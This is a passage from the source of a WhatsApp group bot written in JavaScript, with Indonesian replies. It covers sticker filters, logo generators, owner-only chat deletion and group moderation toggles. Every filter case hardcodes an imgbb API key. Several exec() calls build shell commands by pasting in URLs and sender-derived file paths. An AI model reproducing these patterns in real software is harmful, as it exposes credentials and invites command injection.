                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'smoke':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/smoketext?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'pubg':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} chan|kawai`)
                makell = args.join(" ")
                tex1 = makell.split("|")[0];
                tex2 = makell.split("|")[1];
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/pubglogo?apikey=${ZeksApi}&text1=${tex1}&text2=${tex2}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'skytext':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/skytext?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'brandlogo':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} chan|kawai`)
                makell = args.join(" ")
                tex1 = makell.split("|")[0];
                tex2 = makell.split("|")[1];
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/brand-logo?apikey=${ZeksApi}&text1=${tex1}&text2=${tex2}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'gplaybutton':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/gplaybutton?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'trigger':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'horny':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/horny?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu1)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'red':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/red?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu1)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'pixelate':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/pixelate?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu1)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'blur':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/blur?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu1)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'greyscale':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/greyscale?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu1)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'sepia':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/sepia?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu1)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'green':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/green?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu1)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'wasted':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu1)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'jail':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/jail?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu1)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'simpcard':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/simpcard?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu1)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'pelangi':
            case 'rainbow':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu3 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
                    exec(`wget ${anu3} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        if (err) return reply(mess.error.stick)
                        sendMediaURL(from, anu3)
                        giie.sendMessage(from, fs.readFileSync(rano), sticker)
                        fs.unlinkSync(rano)
                    })

                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'calender':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    anu3 = await getBuffer(`https://api.zeks.me/api/calender?apikey=${ZeksApi}&image=${teks}`)
                    giie.sendMessage(from, anu3, image, {
                        quoted: mek,
                        thumbnail: fs.readFileSync('./gio.jpg')
                    })
                } else {
                    reply('Gunakan foto!')
                }
                break
            case 'd':
            case 'del':
            case 'delete':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                giie.deleteMessage(from, {
                    id: mek.message.extendedTextMessage.contextInfo.stanzaId,
                    remoteJid: from,
                    fromMe: true
                })
                break
            case 'colong':
                if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
                const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                const meidia = await giie.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
                exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                    if (error) return reply('error')
                    giie.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {
                        quoted: mek
                    })
                    fs.unlinkSync(meidia)
                    fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
                })
                break
            case 'readmore':
            case 'more':
                const more = String.fromCharCode(8206)
                const readmore = more.repeat(4001)
                if (!c.includes('|')) return reply(mess.error.api)
                const text1 = c.substring(0, c.indexOf('|') - 0)
                const text2 = c.substring(c.lastIndexOf('|') + 1)
                reply(text1 + readmore + text2)
                break
                
             case 'seenby':
             if(!isGroup) return reply(mess.only.group)
             try {
             infom = await giie.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
             tagg = []
             teks = `*• Read by :*\n\n`
             for(let i of infom.reads){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `👀 ` + moment(`${i.t}` * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY hh:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             teks += `*• Delivered to :*\n\n`
             for(let i of infom.deliveries){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `👀 ` + moment(`${i.t}` * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY hh:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             mentions(teks, tagg, true)
             } catch (e) {
             console.log(color(e))
             reply('*Reply chat bot!*')
}
            break
            case 'delchat':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                reply('Sukses menghapus chat' + from)
                await sleep(4000)
                giie.modifyChat(from, ChatModification.delete)
                break
            case 'clearall':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                anu = await giie.chats.all()
                giie.setMaxListeners(25)
                for (let _ of anu) {
                    giie.deleteChat(_.jid)
                }
                reply('Sukses membersihkan semua pesan')
                break
            case 'mute':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot berhasil dimute di chat ini')
                break
            case 'restart':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                reply(`_Restarting ${NamaBot}_`)
                exec(`cd &&  node index`)
                sleep(4000)
                reply('Sukses')
                break
            case 'detikvn':
                encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                mediam = await giie.downloadAndSaveMediaMessage(encmediam)
                cokmatane = Number(args[0])
                hah = fs.readFileSync(mediam)
                giie.sendMessage(from, hah, audio, {
                    mimetype: 'audio/mp4',
                    duration: cokmatane,
                    ptt: true,
                    quoted: mek
                })
                fs.unlinkSync(mediam)
                break
            case 'detikvideo':
                encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                median = await giie.downloadAndSaveMediaMessage(encmedian)
                cokmatane = Number(args[0])
                hah = fs.readFileSync(median)
                giie.sendMessage(from, hah, video, {
                    mimetype: 'video/mp4',
                    duration: cokmatane,
                    quoted: mek
                })
                fs.unlinkSync(median)
                break
            case 'autoketik':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Pilih on atau off')
                if (args[0] === "on") {
                    if (autoketik === true) return
                    autoketik = true
                    reply(`Succes mengaktifkan autoketik`)
                } else if (args[0] === "off") {
                    if (autoketik === false) return
                    autoketik = false
                    reply(`Succes mematikan autoketik`)
                } else if (!c) {
                    anu = `*AUTO KETIK*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan \n*OFF*: untuk menonaktifkan`
                    punten = [{
                        buttonId: 'autoketik on',
                        buttonText: {
                            displayText: 'ON ☺︎︎'
                        },
                        type: 1
                    }, {
                        buttonId: 'autoketik off',
                        buttonText: {
                            displayText: 'OFF ☹︎'
                        },
                        type: 1
                    }]
                    const btnasu = {
                        contentText: `${anu}`,
                        footerText: '*_Developer by: AyogiAk|JavaScript_*',
                        buttons: punten,
                        headerType: 1
                    }
                    await giie.sendMessage(from, btnasu, MessageType.buttonsMessage, {
                        quoted: fgi
                    })
                }
                break

            case 'autovn':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Pilih on atau off')
                if (args[0] === "on") {
                    if (autovn === true) return
                    autovn = true
                    reply(`Succes mengaktifkan autovn`)
                } else if (args[0] === "off") {
                    if (autovn === false) return
                    autovn = false
                    reply(`Succes mematikan autovn`)
                } else if (!c) {
                    anu = `*AUTO VN*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan \n*OFF*: untuk menonaktifkan`
                    punten = [{
                        buttonId: 'autovn on',
                        buttonText: {
                            displayText: 'ON ☺︎︎'
                        },
                        type: 1
                    }, {
                        buttonId: 'autovn off',
                        buttonText: {
                            displayText: 'OFF ☹︎'
                        },
                        type: 1
                    }]
                    const btnasu = {
                        contentText: `${anu}`,
                        footerText: '*_Developer by: AyogiAk|JavaScript_*',
                        buttons: punten,
                        headerType: 1
                    }
                    await giie.sendMessage(from, btnasu, MessageType.buttonsMessage, {
                        quoted: fgi
                    })
                }
                break

            case 'autoread':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                anu = `*AUTO READ SETTING*\n_Please Click Button Dibawah !_\n\n*Read Pc*: untuk mengaktifkan read pc \n*Read Gc*: untuk mengaktifkan read gc`
                punten = [{
                    buttonId: 'autoread pc',
                    buttonText: {
                        displayText: 'READ PC'
                    },
                    type: 1
                }, {
                    buttonId: 'autoread gc',
                    buttonText: {
                        displayText: 'READ GC'
                    },
                    type: 1
                }]
                const autoreads = {
                    contentText: `${anu}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                anugc = `*AUTO READ GC*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan\n*OFF*: untuk menonaktifkan`
                puntengc = [{
                    buttonId: 'autoread gc on',
                    buttonText: {
                        displayText: 'ON ☺︎︎'
                    },
                    type: 1
                }, {
                    buttonId: 'autoread gc off',
                    buttonText: {
                        displayText: 'OFF ☹︎'
                    },
                    type: 1
                }]
                const autoreadgc = {
                    contentText: `${anugc}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: puntengc,
                    headerType: 1
                }
                anupc = `*AUTO READ PC*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan\n*OFF*: untuk menonaktifkan `
                puntenpc = [{
                    buttonId: 'autoread pc on',
                    buttonText: {
                        displayText: 'ON ☺︎︎'
                    },
                    type: 1
                }, {
                    buttonId: 'autoread pc off',
                    buttonText: {
                        displayText: 'OFF ☹︎'
                    },
                    type: 1
                }]
                const autoreadpc = {
                    contentText: `${anupc}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: puntenpc,
                    headerType: 1
                }
                if (args.length < 1) return giie.sendMessage(from, autoreads, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                if (args[0] === "gc") {
                    if (args.length < 2) return giie.sendMessage(from, autoreadgc, MessageType.buttonsMessage, {
                        quoted: fgi
                    })
                    if (args[1] === "on") {
                        if (readGc === true) return
                        readGc = true
                        reply(`Succes mengaktifkan autoread group`)
                    } else if (args[1] === "off") {
                        if (readGc === false) return
                        readGc = false
                        reply(`Succes mematikan autoread group`)
                    } else {
                        reply(`Pilih on atau off`)
                    }
                } else if (args[0] === "pc") {
                    if (args.length < 2) return giie.sendMessage(from, autoreadpc, MessageType.buttonsMessage, {
                        quoted: fgi
                    })
                    if (args[1] === "on") {
                        if (readPc === true) return
                        readPc = true
                        reply(`Succes mengaktifkan autoread pc`)
                    } else if (args[1] === "off") {
                        if (readPc === false) return
                        readPc = false
                        reply(`Succes mematikan autoread pc`)
                    } else {
                        reply(`Pilih on atau off`)
                    }
                }
                break
            case 'welcome':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                if (args.length < 1) return reply('!welcome on/off')
                if ((args[0]) === 'on') {
                    if (isWelkom) return reply('Udah aktif')
                    welkom.push(from)
                    fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
                    reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
                } else if ((args[0]) === 'off') {
                    welkom.splice(from, 1)
                    fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
                    reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
                } else if (!c) {
                    anu = `*WELCOME*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan\n*OFF*: untuk menonaktifkan`
                    punten = [{
                        buttonId: 'welcome on',
                        buttonText: {
                            displayText: 'ON ☺︎︎'
                        },
                        type: 1
                    }, {
                        buttonId: 'welcome off',
                        buttonText: {
                            displayText: 'OFF ☹︎'
                        },
                        type: 1
                    }]
                    const btnasu = {
                        contentText: `${anu}`,
                        footerText: '*_Developer by: AyogiAk|JavaScript_*',
                        buttons: punten,
                        headerType: 1
                    }
                    await giie.sendMessage(from, btnasu, MessageType.buttonsMessage, {
                        quoted: fgi
                    })
                }
                break
            case 'antidelete':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                // zlif (args.length < 1) return reply('!antidelete on/off')
                if ((args[0]) === 'on') {
                    if (isAntidelete) return reply('Udah aktif')
                    antidelete.push(from)
                    fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidelete))
                    reply('Sukses mengaktifkan fitur antidelete di group ini ✔️')
                } else if ((args[0]) === 'off') {
                    antidelete.splice(from, 1)
                    fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidelete))
                    reply('Sukses menonaktifkan fitur antidelete di group ini ✔️')
                } else if (!c) {
                    anu = `*ANTI DELETE*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan\n*OFF*: untuk menonaktifkan`
                    punten = [{
                        buttonId: 'antidelete on',
                        buttonText: {
                            displayText: 'ON ☺︎︎'
                        },
                        type: 1
                    }, {
                        buttonId: 'antidelete off',
                        buttonText: {
                            displayText: 'OFF ☹︎'
                        },
                        type: 1
                    }]
                    const btnasu = {
                        contentText: `${anu}`,
                        footerText: '*_Developer by: AyogiAk|JavaScript_*',
                        buttons: punten,
                        headerType: 1
                    }
                    await giie.sendMessage(from, btnasu, MessageType.buttonsMessage, {
                        quoted: fgi
                    })
                }
                break
            case 'antilink':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                if ((args[0]) === 'on') {
                    if (isAntiLink) return reply('Sudah Aktif Kak')
                    antilink.push(from)
                    fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
                    reply('Sukses mengaktifkan fitur antilink')
                    giie.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
                } else if ((args[0]) === 'off') {
                    if (!isAntiLink) return reply('Sudah Mati Kak')
                    var ini = antilink.indexOf(from)
                    antilink.splice(ini, 1)
                    fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
                    reply('Sukses menonaktifkan fitur antilink')
                } else if (!c) {
                    anu = `*ANTI LINK*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan \n*OFF*: untuk menonaktifkan`
                    punten = [{
                        buttonId: 'antilink on',
                        buttonText: {
                            displayText: 'ON ☺︎︎'
                        },
                        type: 1
                    }, {
                        buttonId: 'antilink off',
                        buttonText: {
                            displayText: 'OFF ☹︎'
                        },
                        type: 1
                    }]
                    const btnasu = {
                        contentText: `${anu}`,
                        footerText: '*_Developer by: AyogiAk|JavaScript_*',
                        buttons: punten,
                        headerType: 1
                    }
                    await giie.sendMessage(from, btnasu, MessageType.buttonsMessage, {
                        quoted: fgi
                    })
                }
                break
                case 'badword':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                if ((args[0]) === 'on') {
                    if (isBadword) return reply('Sudah Aktif Kak')
                    badword.push(from)
                    fs.writeFileSync('./database/badword.json', JSON.stringify(badword))
                    reply('Sukses mengaktifkan fitur badword')
                    giie.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti badword\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
                } else if ((args[0]) === 'off') {
                    if (!isBadword) return reply('Sudah Mati Kak')
                    var ini = badword.indexOf(from)
                    badword.splice(ini, 1)
                    fs.writeFileSync('./database/badword.json', JSON.stringify(badword))
                    reply('Sukses menonaktifkan fitur badword')
                } else if (!c) {
                    anu = `*BAD WORD*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan \n*OFF*: untuk menonaktifkan`
                    punten = [{
                        buttonId: 'badword on',
                        buttonText: {
                            displayText: 'ON ☺︎︎'
                        },
                        type: 1
                    }, {
                        buttonId: 'badword off',
                        buttonText: {
                            displayText: 'OFF ☹︎'
                        },
                        type: 1
                    }]
                    const btnasu = {
                        contentText: `${anu}`,
                        footerText: '*_Developer by: AyogiAk|JavaScript_*',
                        buttons: punten,
                        headerType: 1
                    }
